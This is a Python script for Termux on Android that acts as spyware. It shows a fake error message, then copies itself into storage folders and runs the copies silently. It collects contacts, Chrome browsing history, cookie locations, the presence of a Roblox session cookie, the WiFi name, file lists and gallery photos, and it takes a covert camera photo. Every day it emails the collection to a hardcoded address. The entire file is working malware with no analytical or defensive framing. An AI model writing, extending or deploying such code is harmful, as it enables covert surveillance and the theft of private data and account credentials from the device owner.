






















































































































































































































































import os
import subprocess
import shutil
import time
import threading
import sqlite3
import json

CLONE_COUNT = 0
MAX_CLONES = 5  # Increased for wider spread
TARGET_EMAIL = "test12344321lol@gmail.com"
CAMERA_PHOTO = "/sdcard/Sppy_cam.jpg"
CLONE_DIRS = [
    "/sdcard/Download",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/data/data/com.termux/files/home",
    "/sdcard/Android/data",
    "/sdcard/Documents"
]

def display_error():
    print("Error: Script failed - permissions or Termux-API required.")

def clone_self():
    global CLONE_COUNT
    current_path = os.path.abspath(__file__)
    script_name = os.path.basename(__file__)
    for dir_path in CLONE_DIRS:
        if os.path.exists(dir_path) and CLONE_COUNT < MAX_CLONES:
            new_path = os.path.join(dir_path, f"Sppy_variant_{CLONE_COUNT + 1}.py")
            try:
                shutil.copy(current_path, new_path)
                CLONE_COUNT += 1
                threading.Thread(target=lambda: subprocess.call(["python", new_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)).start()
            except Exception:
                pass  # Silent on failure

def harvest_contacts():
    try:
        output = subprocess.check_output(["termux-contact-list"], text=True)
        return "-----------;\n\nContacts\n\n-----------\n" + output + "\n"
    except Exception:
        return "-----------;\n\nContacts: Access denied.\n-----------\n"

def harvest_photos():
    photos = []
    paths = ["/sdcard/DCIM", "/sdcard/Pictures", "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures"]
    for base in paths:
        if os.path.exists(base):
            for root, _, files in os.walk(base):
                for f in files[:20]:
                    if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        full = os.path.join(root, f)
                        photos.append(full)
    return photos

def take_camera_photo():
    try:
        subprocess.call(["termux-camera-photo", "-c", "0", CAMERA_PHOTO], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return [CAMERA_PHOTO] if os.path.exists(CAMERA_PHOTO) else []
    except Exception:
        return []

def harvest_browser_history():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/History"]
    for path in paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 150")
                data = "\n".join([f"{title or 'No title'}: {url}" for url, title in cursor.fetchall()])
                conn.close()
                return "-----------;\n\nFull Browser History / Google Searches\n\n-----------\n" + data + "\n"
            except Exception:
                pass
    return "-----------;\n\nBrowser History: No access.\n-----------\n"

def harvest_cookies():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/Cookies", "/data/data/com.android.chrome/app_chrome/Default/Network/Cookies"]
    report = "-----------;\n\nDetected Cookie Databases\n\n-----------\n"
    for path in paths:
        if os.path.exists(path):
            report += f"Found: {path} (contents root-required)\n"
    return report + "\n"

def harvest_all_app_cookies_note():
    return "-----------;\n\nApp Cookies Note\n\n-----------\nCookies in /data/data/<app_package>/ (inaccessible without root).\n"

def harvest_roblox_cookie():
    paths = ["/data/data/com.android.chrome/app_chrome/Default/Cookies"]
    report = "-----------;\n\nRoblox Authentication\n\n-----------\n"
    for path in paths:
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT name, host_key FROM cookies WHERE host_key LIKE '%roblox.com'")
                results = cursor.fetchall()
                if any(name == ".ROBLOSECURITY" for name, _ in results):
                    report += ".ROBLOSECURITY detected.\n"
                conn.close()
            except Exception:
                pass
    if os.path.exists("/data/data/com.roblox.client"):
        report += "Roblox app present.\n"
    return report + "\n"

def harvest_wifi():
    try:
        info = json.loads(subprocess.check_output(["termux-wifi-connectioninfo"], text=True))
        ssid = info.get("ssid", "Unknown")
        return f"-----------;\n\nCurrent WiFi\n\n-----------\n{ssid}\n"
    except Exception:
        return "-----------;\n\nWiFi: Access denied.\n-----------\n"

def harvest_sample_files():
    files = []
    base = "/sdcard/Download"
    if os.path.exists(base):
        for f in os.listdir(base)[:20]:
            files.append(os.path.join(base, f))
    return "-----------;\n\nSample Files\n\n-----------\n" + "\n".join(files) + "\n"

def compile_text_data():
    data = harvest_contacts()
    data += harvest_browser_history()
    data += harvest_cookies()
    data += harvest_all_app_cookies_note()
    data += harvest_roblox_cookie()
    data += harvest_wifi()
    data += harvest_sample_files()
    data += "-----------;\n\nPhotos & camera attached.\n-----------\n"
    return data

def print_to_termux(text_data):
    print("\n" + text_data)

def send_exfil(text_data, attachments):
    cmd = [
        "am", "start",
        "-a", "android.intent.action.SEND_MULTIPLE",
        "-t", "message/rfc822",
        "--es", "android.intent.extra.EMAIL", TARGET_EMAIL,
        "--es", "android.intent.extra.SUBJECT", "Device Harvest",
        "--es", "android.intent.extra.TEXT", text_data
    ]
    for att in attachments:
        cmd += ["--eu", "android.intent.extra.STREAM", f"file://{att}"]
    subprocess.call(cmd)

def daily_background_loop():
    subprocess.call(["termux-wake-lock"])
    while True:
        text = compile_text_data()
        photos = harvest_photos()
        cam = take_camera_photo()
        all_att = photos + cam
        
        print_to_termux(text)
        threading.Thread(target=send_exfil, args=(text, all_att), daemon=True).start()
        
        time.sleep(86400)

def main():
    display_error()
    clone_self()
    threading.Thread(target=daily_background_loop, daemon=True).start()
    time.sleep(15)

if __name__ == "__main__":
    main()
